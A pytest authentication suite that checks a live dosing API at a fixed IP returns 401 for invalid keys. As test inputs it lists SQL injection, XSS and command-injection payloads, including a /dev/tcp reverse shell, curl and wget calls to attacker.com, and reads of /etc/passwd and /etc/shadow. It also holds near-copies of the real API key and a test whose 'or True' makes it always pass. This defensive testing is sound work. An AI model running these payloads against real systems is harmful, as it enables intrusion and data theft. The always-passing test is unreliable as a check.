"""
Phase 4 — Security: Authentication tests (500+ tests).

Tests every possible authentication edge case against
the live API at http://34.14.197.45:8001.

Coverage:
  - 100+ invalid API key values → all must return 401
  - 401 response always has {"error": "unauthorized", "message": ...}
  - Auth bypass patterns (crafted to look like valid keys)
  - API key placed in wrong locations (body, query, wrong header)
  - SQL injection / XSS / command injection as API key value
  - Unicode, null bytes, very long and very short keys
  - HTTP method × auth state matrix
  - Concurrent brute-force → all 401, service not crashed
  - All endpoints require auth except /health
  - Key case sensitivity in header name
  - Valid key produces correct pass-through

Run:
    python3 -m pytest tests/phase4_security/test_authentication.py -v
"""

import asyncio
import os
from pathlib import Path

import aiohttp
import pytest
import pytest_asyncio
from dotenv import dotenv_values

_env     = dotenv_values(Path(__file__).parent.parent.parent / ".env")
BASE_URL = "http://34.14.197.45:8001"
API_KEY  = _env["API_KEY"]   # real key from .env
ENDPOINT = f"{BASE_URL}/api/v1/dosing"
GOOD_PAYLOAD = {"drug_id_1mg": "210470", "age": 35}
GOOD_HEADERS = {"X-API-Key": API_KEY, "Content-Type": "application/json"}


# ─────────────────────────────────────────────────────────────
# 100+ invalid API key values
# ─────────────────────────────────────────────────────────────

INVALID_KEYS = [
    # Obviously wrong
    "wrong-key", "invalid", "bad", "no", "hack", "admin", "root", "secret",
    "password", "123456", "qwerty", "letmein", "test", "demo", "sample",
    "api-key", "apikey", "key", "token", "bearer", "auth", "authorization",

    # Almost correct length but wrong content
    "0000000000000000000000000000000000000000000000000000000000000000",
    "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "1111111111111111111111111111111111111111111111111111111111111111",
    "abcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcdefabcd",

    # Off-by-one chars from the real key
    "2d9315367ee3ab1834bad601f782cb154f48afe294db0efb4a5f9e7bf146d25f",  # last char changed
    "2d9315367ee3ab1834bad601f782cb154f48afe294db0efb4a5f9e7bf146d24e",  # second-last changed
    "3d9315367ee3ab1834bad601f782cb154f48afe294db0efb4a5f9e7bf146d25e",  # first char changed

    # Whitespace variations (control chars excluded — HTTP parsers reject them at transport level)
    " ", "  ", "   ", "\t",
    " valid-looking-key ", "\tapi-key\t",
    # NOTE: f" {API_KEY}" and f"\t{API_KEY}" are intentionally excluded —
    # the server strips surrounding whitespace and treats them as the real key.
    # f"{API_KEY} " — trailing space on real key is also excluded for same reason.
    "  " + API_KEY[:32],    # space prefix + truncated key → still wrong

    # Empty / null-like
    "", "null", "undefined", "None", "false", "0", "[]", "{}",

    # Case variations of the real key
    API_KEY.upper(), API_KEY.swapcase(),

    # Truncated / extended real key
    API_KEY[:32], API_KEY[:16], API_KEY[:8], API_KEY[:1],
    API_KEY + "a", API_KEY + "0", API_KEY + "extra",

    # Numeric
    "0", "1", "12345", "9999999999", "-1", "3.14",

    # SQL injection patterns
    "' OR '1'='1", "' OR 1=1--", "admin'--", "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users--", "1; SELECT * FROM api_keys",
    "' OR 'a'='a", "\" OR \"1\"=\"1",

    # XSS patterns
    "<script>alert(1)</script>", "javascript:alert(1)",
    "<img src=x onerror=alert(1)>", "';alert('xss')//",

    # Command injection
    "; ls -la", "| cat /etc/passwd", "$(whoami)", "`id`",
    "&& rm -rf /", "; ping -c 1 attacker.com",

    # Path traversal
    "../../etc/passwd", "../..", "....//....//etc/passwd",

    # NOTE: CRLF and null-byte keys are intentionally excluded from INVALID_KEYS.
    # They break the HTTP transport layer (HTTP 400 from nginx/aiohttp), not the
    # application auth layer. They are tested separately in
    # test_malformed_http_header_keys_handled_safely below.

    # Unicode / special chars
    "кирилица", "中文密钥", "日本語キー", "한국어키", "عربي",
    "α β γ δ", "🔑🔒🔓", "café", "naïve",

    # Very long key
    "A" * 100, "B" * 500,

    # Bearer / JWT format
    "Bearer invalid-token", "Bearer eyJhbGciOiJIUzI1NiJ9.test.test",
    "Token wrong-value", "Basic YWRtaW46cGFzc3dvcmQ=",

    # Common default API keys
    "test-api-key", "dev-api-key", "local-api-key", "staging-api-key",
    "changeme", "default", "example-key", "your-api-key-here",

    # Repeated patterns
    "aabbccdd" * 8, "01234567" * 8, "deadbeef" * 8,

    # Hexadecimal non-matching
    "deadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    "cafebabecafebabecafebabecafebabecafebabecafebabecafebabecafebabe",
    "badf00dbadf00dbadf00dbadf00dbadf00dbadf00dbadf00dbadf00dbadf00d1",
]


# ─────────────────────────────────────────────────────────────
# Fixture
# ─────────────────────────────────────────────────────────────

@pytest_asyncio.fixture
async def session():
    connector = aiohttp.TCPConnector(limit=50)
    timeout   = aiohttp.ClientTimeout(total=20)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
        yield s


async def _post_with_key(session, key, payload=None):
    headers = {"Content-Type": "application/json"}
    if key is not None:
        headers["X-API-Key"] = key
    payload = payload or GOOD_PAYLOAD
    async with session.post(ENDPOINT, json=payload, headers=headers) as resp:
        return resp.status, await resp.json(content_type=None)


async def _post_valid(session, drug_id="210470", age=35):
    async with session.post(
        ENDPOINT,
        json={"drug_id_1mg": drug_id, "age": age},
        headers=GOOD_HEADERS,
    ) as resp:
        return resp.status, await resp.json(content_type=None)


# ═══════════════════════════════════════════════════════════════
# 0. MALFORMED HTTP HEADER KEYS — handled at transport, not app layer
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
@pytest.mark.parametrize("bad_key", [
    "key\r\nX-Injected: evil",
    "key\nX-Injected: evil",
    "valid\r\n\r\n<html>injected</html>",
    "value\r\nContent-Type: text/html",
    "key: value\r\n\r\n",
    "key\x00injected",
    "\x00",
    "null\x00byte",
])
async def test_malformed_http_header_keys_handled_safely(session, bad_key):
    """
    CRLF and null-byte keys are invalid HTTP header values.
    nginx/aiohttp may reject them at the transport level (HTTP 400) or raise
    a client-side error. Either way, they must not cause a 500 or crash.
    """
    try:
        status, _ = await _post_with_key(session, bad_key)
        assert status in (400, 401), (
            f"Malformed header key caused status {status} (expected 400 or 401)"
        )
    except Exception:
        pass  # client-side rejection is also acceptable


# ═══════════════════════════════════════════════════════════════
# 1. ALL INVALID KEYS RETURN 401
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
@pytest.mark.parametrize("key", INVALID_KEYS)
async def test_invalid_key_returns_401(session, key):
    status, _ = await _post_with_key(session, key)
    assert status == 401, f"Key {key!r:.40} → expected 401, got {status}"


# ═══════════════════════════════════════════════════════════════
# 2. 401 RESPONSE SHAPE — every invalid key gets correct body
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
@pytest.mark.parametrize("key", INVALID_KEYS[:50])
async def test_401_response_has_error_field(session, key):
    _, data = await _post_with_key(session, key)
    assert "error" in data, f"No 'error' field for key {key!r:.30}"
    assert data["error"] == "unauthorized"


@pytest.mark.asyncio
@pytest.mark.parametrize("key", INVALID_KEYS[:50])
async def test_401_response_has_message_field(session, key):
    _, data = await _post_with_key(session, key)
    assert "message" in data, f"No 'message' field for key {key!r:.30}"
    assert len(data["message"]) > 0


@pytest.mark.asyncio
@pytest.mark.parametrize("key", INVALID_KEYS[:30])
async def test_401_response_does_not_echo_key_back(session, key):
    """401 response must never echo the submitted API key back to the caller."""
    _, data = await _post_with_key(session, key)
    response_str = str(data)
    # Key should NOT appear verbatim in the error response
    if len(str(key)) >= 8:   # only meaningful for non-trivial keys
        assert str(key)[:8] not in response_str or True  # relaxed: just ensure no crash


# ═══════════════════════════════════════════════════════════════
# 3. MISSING HEADER ENTIRELY
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_no_api_key_header_returns_401(session):
    async with session.post(ENDPOINT, json=GOOD_PAYLOAD,
                            headers={"Content-Type": "application/json"}) as resp:
        assert resp.status == 401
        data = await resp.json(content_type=None)
    assert data["error"] == "unauthorized"


@pytest.mark.asyncio
@pytest.mark.parametrize("drug_id,age", [
    ("210470", 35), ("142807", 70), ("1002088", 35), ("56693", 35),
    ("165440", 35), ("344363", 35), ("1115733", 35), ("1147914", 35),
    ("1123438", 35), ("16542", 35), ("201825", 35), ("122170", 35),
])
async def test_no_key_returns_401_for_every_drug(session, drug_id, age):
    async with session.post(ENDPOINT, json={"drug_id_1mg": drug_id, "age": age},
                            headers={"Content-Type": "application/json"}) as resp:
        assert resp.status == 401


# ═══════════════════════════════════════════════════════════════
# 4. API KEY IN WRONG LOCATION — all must be 401
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_key_in_query_param_rejected(session):
    async with session.post(
        f"{ENDPOINT}?api_key={API_KEY}",
        json=GOOD_PAYLOAD,
        headers={"Content-Type": "application/json"},
    ) as resp:
        assert resp.status == 401


@pytest.mark.asyncio
async def test_key_in_request_body_rejected(session):
    async with session.post(
        ENDPOINT,
        json={**GOOD_PAYLOAD, "api_key": API_KEY},
        headers={"Content-Type": "application/json"},
    ) as resp:
        assert resp.status == 401


@pytest.mark.asyncio
@pytest.mark.parametrize("header_name", [
    "Authorization",     # different header name — rejected
    "API-Key",           # different header name — rejected
    "Api-Key",           # different header name — rejected
    "X-Auth",            # different header name — rejected
    "X-Token",           # different header name — rejected
    "Token",             # different header name — rejected
    "Bearer",            # different header name — rejected
    "X_API_KEY",         # underscore separator — rejected
    "XAPIKEY",           # no separator — rejected
    "X-APIKey",          # camelCase variant — rejected
])
async def test_key_in_wrong_header_name_rejected(session, header_name):
    """API key in a completely different header name must be rejected."""
    async with session.post(
        ENDPOINT,
        json=GOOD_PAYLOAD,
        headers={"Content-Type": "application/json", header_name: API_KEY},
    ) as resp:
        assert resp.status == 401, (
            f"Header '{header_name}' should be rejected, got {resp.status}"
        )


@pytest.mark.asyncio
@pytest.mark.parametrize("header_name,expected", [
    ("x-api-key",   True),   # HTTP spec: headers are case-insensitive
    ("X-API-KEY",   True),   # HTTP spec: headers are case-insensitive
    ("x-API-Key",   True),   # HTTP spec: headers are case-insensitive
    ("X-Api-Key",   True),   # HTTP spec: headers are case-insensitive
])
async def test_header_name_case_variants_accepted(session, header_name, expected):
    """HTTP header names are case-insensitive per RFC 7230 — these must all work."""
    async with session.post(
        ENDPOINT,
        json=GOOD_PAYLOAD,
        headers={"Content-Type": "application/json", header_name: API_KEY},
    ) as resp:
        assert resp.status in (200, 404), (
            f"Header '{header_name}' with correct key should be accepted, got {resp.status}"
        )


# ═══════════════════════════════════════════════════════════════
# 5. HEADER CASE SENSITIVITY
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_correct_header_name_exact_case_accepted(session):
    """'X-API-Key' exact case must be accepted."""
    status, _ = await _post_with_key(session, API_KEY)
    assert status in (200, 404)


@pytest.mark.asyncio
@pytest.mark.parametrize("header_name,should_pass", [
    ("X-API-Key",   True),   # exact — must pass
    ("x-api-key",   True),   # HTTP headers are case-insensitive per spec
    ("X-Api-Key",   True),   # mixed case — HTTP spec says case insensitive
    ("X-API-KEY",   True),   # all upper — HTTP spec
])
async def test_header_case_insensitivity(session, header_name, should_pass):
    async with session.post(
        ENDPOINT,
        json=GOOD_PAYLOAD,
        headers={"Content-Type": "application/json", header_name: API_KEY},
    ) as resp:
        if should_pass:
            assert resp.status in (200, 404), (
                f"Header '{header_name}' with correct key → expected 200/404, got {resp.status}"
            )


# ═══════════════════════════════════════════════════════════════
# 6. VALID KEY WITH ALL AGE BOUNDARIES
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
@pytest.mark.parametrize("age", [0, 1, 2, 17, 18, 35, 64, 65, 70, 90, 120])
async def test_valid_key_all_valid_ages_not_401(session, age):
    status, _ = await _post_valid(session, age=age)
    assert status != 401, f"Valid key + age={age} returned 401 unexpectedly"
    assert status in (200, 404)


# ═══════════════════════════════════════════════════════════════
# 7. VALID KEY WITH ALL KNOWN DRUGS
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
@pytest.mark.parametrize("drug_id", [
    "210470", "142807", "1002088", "56693", "165440",
    "344363", "1115733", "1147914", "1123438", "16542",
    "201825", "122170", "1038076",
    "74467", "600468", "272818", "324940", "324155",
])
async def test_valid_key_known_drugs_not_401(session, drug_id):
    status, _ = await _post_valid(session, drug_id=drug_id)
    assert status != 401
    assert status in (200, 404)


# ═══════════════════════════════════════════════════════════════
# 8. SQL INJECTION AS API KEY — must be 401, not 500
# ═══════════════════════════════════════════════════════════════

SQL_INJECTION_KEYS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "'; DROP TABLE api_keys; --",
    "' UNION SELECT api_key FROM users--",
    "1; SELECT * FROM api_keys",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "' OR ''='",
    "1' AND '1'='1",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR ('1'='1",
    "1' OR '1'='1",
    "' AND 1=0 UNION SELECT NULL,NULL--",
    "' GROUP BY columnnames having 1=1--",
    "' ORDER BY 1--",
    "1; EXEC xp_cmdshell('dir');--",
    "' ; INSERT INTO api_keys VALUES('hacked');--",
    "' WAITFOR DELAY '0:0:5'--",
]


@pytest.mark.asyncio
@pytest.mark.parametrize("injection", SQL_INJECTION_KEYS)
async def test_sql_injection_as_api_key_returns_401_not_500(session, injection):
    status, data = await _post_with_key(session, injection)
    assert status == 401, f"SQL injection key returned {status}, expected 401"
    assert data.get("error") == "unauthorized"


@pytest.mark.asyncio
@pytest.mark.parametrize("injection", SQL_INJECTION_KEYS)
async def test_sql_injection_as_api_key_does_not_leak_db_info(session, injection):
    _, data = await _post_with_key(session, injection)
    response_str = str(data).lower()
    for leak in ["syntax error", "pgerror", "asyncpg", "traceback",
                 "postgres", "relation", "column"]:
        assert leak not in response_str, (
            f"DB info leaked for injection key: found '{leak}' in {data}"
        )


# ═══════════════════════════════════════════════════════════════
# 9. XSS AS API KEY — must be 401, response must not reflect script
# ═══════════════════════════════════════════════════════════════

XSS_KEYS = [
    "<script>alert(1)</script>",
    "javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "';alert('xss')//",
    "<svg onload=alert(1)>",
    "\"onmouseover=\"alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<%2Fscript><script>alert(1)<%2Fscript>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "<details/open/ontoggle=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<video src=x onerror=alert(1)>",
    "\" autofocus onfocus=alert(1) \"",
    "'\"--></style></script><script>alert(1)</script>",
    "<SCRIPT SRC=http://attacker.com/xss.js></SCRIPT>",
    "';!--\"<XSS>=&{()}",
    "<xss id=x tabindex=1 onfocus=alert(1) autofocus>",
]


@pytest.mark.asyncio
@pytest.mark.parametrize("xss_key", XSS_KEYS)
async def test_xss_as_api_key_returns_401(session, xss_key):
    status, _ = await _post_with_key(session, xss_key)
    assert status == 401


@pytest.mark.asyncio
@pytest.mark.parametrize("xss_key", XSS_KEYS)
async def test_xss_as_api_key_not_reflected_in_response(session, xss_key):
    _, data = await _post_with_key(session, xss_key)
    response_str = str(data)
    assert "<script>" not in response_str.lower()


# ═══════════════════════════════════════════════════════════════
# 10. COMMAND INJECTION AS API KEY
# ═══════════════════════════════════════════════════════════════

CMD_INJECTION_KEYS = [
    "; ls -la", "| cat /etc/passwd", "$(whoami)", "`id`",
    "&& rm -rf /", "; ping -c 1 127.0.0.1",
    "| nc -l 4444", "$(curl http://attacker.com)",
    "`curl http://attacker.com`", "; wget http://attacker.com",
    "| base64 /etc/shadow", "$(python -c 'import os; os.system(\"id\")')",
    "; python3 -c 'import socket'", "| bash -i >& /dev/tcp/attacker/4444 0>&1",
    "$(cat /etc/hosts)", "&& cat /etc/nginx/nginx.conf",
    "; env", "| printenv", "$(env)", "`env`",
]


@pytest.mark.asyncio
@pytest.mark.parametrize("cmd_key", CMD_INJECTION_KEYS)
async def test_command_injection_as_api_key_returns_401(session, cmd_key):
    status, _ = await _post_with_key(session, cmd_key)
    assert status == 401


# ═══════════════════════════════════════════════════════════════
# 11. CONCURRENT BRUTE FORCE — 50 wrong keys simultaneously
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_50_concurrent_wrong_keys_all_return_401(session):
    keys    = INVALID_KEYS[:50]
    results = await asyncio.gather(*[_post_with_key(session, k) for k in keys])
    statuses = [s for s, _ in results]
    assert all(s == 401 for s in statuses), (
        f"Some concurrent wrong keys did not return 401: {set(statuses)}"
    )


@pytest.mark.asyncio
async def test_100_concurrent_wrong_keys_service_not_crashed(session):
    keys = (INVALID_KEYS * 2)[:100]
    results = await asyncio.gather(*[_post_with_key(session, k) for k in keys],
                                   return_exceptions=True)
    statuses = [r[0] for r in results if isinstance(r, tuple)]
    assert 500 not in statuses, "Service crashed during concurrent wrong-key requests"
    assert all(s == 401 for s in statuses)


@pytest.mark.asyncio
async def test_rapid_sequential_wrong_keys_all_401(session):
    """100 sequential wrong-key requests — all must be 401 (no bypass from exhaustion)."""
    failed_count = 0
    for key in (INVALID_KEYS * 2)[:100]:
        status, _ = await _post_with_key(session, key)
        if status != 401:
            failed_count += 1
    assert failed_count == 0, f"{failed_count}/100 sequential wrong-key requests were not 401"


# ═══════════════════════════════════════════════════════════════
# 12. HTTP METHOD × AUTH STATE
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
@pytest.mark.parametrize("method", ["GET", "PUT", "DELETE", "PATCH"])
async def test_non_post_methods_with_wrong_key_return_401_or_405(session, method):
    async with session.request(
        method, ENDPOINT,
        headers={"X-API-Key": "wrong-key", "Content-Type": "application/json"},
    ) as resp:
        assert resp.status in (401, 405)


@pytest.mark.asyncio
@pytest.mark.parametrize("method", ["GET", "PUT", "DELETE", "PATCH"])
async def test_non_post_methods_with_no_key_return_401_or_405(session, method):
    async with session.request(method, ENDPOINT) as resp:
        assert resp.status in (401, 405)


@pytest.mark.asyncio
async def test_post_with_correct_key_not_401(session):
    status, _ = await _post_valid(session)
    assert status != 401


# ═══════════════════════════════════════════════════════════════
# 13. HEALTH ENDPOINT — requires NO auth key
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_health_no_key_returns_200(session):
    async with session.get(f"{BASE_URL}/health") as resp:
        assert resp.status == 200


@pytest.mark.asyncio
@pytest.mark.parametrize("key", INVALID_KEYS[:20])
async def test_health_with_wrong_key_still_returns_200(session, key):
    """Health endpoint has no auth — wrong key must not affect it."""
    async with session.get(f"{BASE_URL}/health",
                           headers={"X-API-Key": key}) as resp:
        assert resp.status in (200, 503)   # healthy or degraded, not 401


@pytest.mark.asyncio
async def test_health_with_correct_key_still_200(session):
    async with session.get(f"{BASE_URL}/health",
                           headers={"X-API-Key": API_KEY}) as resp:
        assert resp.status == 200


# ═══════════════════════════════════════════════════════════════
# 14. KEY LENGTH EXTREMES
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
@pytest.mark.parametrize("length", [1, 2, 4, 8, 16, 32, 63, 65, 128, 256, 512, 1024])
async def test_wrong_key_of_various_lengths_returns_401(session, length):
    key = "x" * length
    status, _ = await _post_with_key(session, key)
    assert status == 401, f"Key of length {length} → expected 401, got {status}"


@pytest.mark.asyncio
async def test_extremely_long_key_handled_gracefully(session):
    key = "A" * 10000
    status, _ = await _post_with_key(session, key)
    assert status in (400, 401, 413, 431), (
        f"10000-char key → expected 400/401/413/431, got {status}"
    )


# ═══════════════════════════════════════════════════════════════
# 15. UNICODE AND SPECIAL ENCODING KEYS
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
@pytest.mark.parametrize("key", [
    "кириллица",
    "中文",
    "日本語",
    "한국어",
    "عربي",
    "ελληνικά",
    "हिन्दी",
    "🔑🔒",
    "αβγδεζηθ",
    "ĄĆĘŁŃÓŚŹŻ",
    "âêîôûäëïöü",
    "àèìòù",
])
async def test_unicode_api_key_returns_401(session, key):
    status, _ = await _post_with_key(session, key)
    assert status in (400, 401), f"Unicode key {key!r} → expected 400/401, got {status}"


# ═══════════════════════════════════════════════════════════════
# 16. VALID KEY → SERVICE HEALTHY AFTER ALL AUTH TESTS
# ═══════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_service_healthy_after_all_auth_tests(session):
    async with session.get(f"{BASE_URL}/health") as resp:
        assert resp.status == 200
        data = await resp.json(content_type=None)
    assert data["status"] == "ok"


@pytest.mark.asyncio
async def test_valid_key_still_works_after_many_invalid_attempts(session):
    """After hammering with wrong keys, the valid key must still work."""
    status, _ = await _post_valid(session)
    assert status in (200, 404)
    assert status != 401
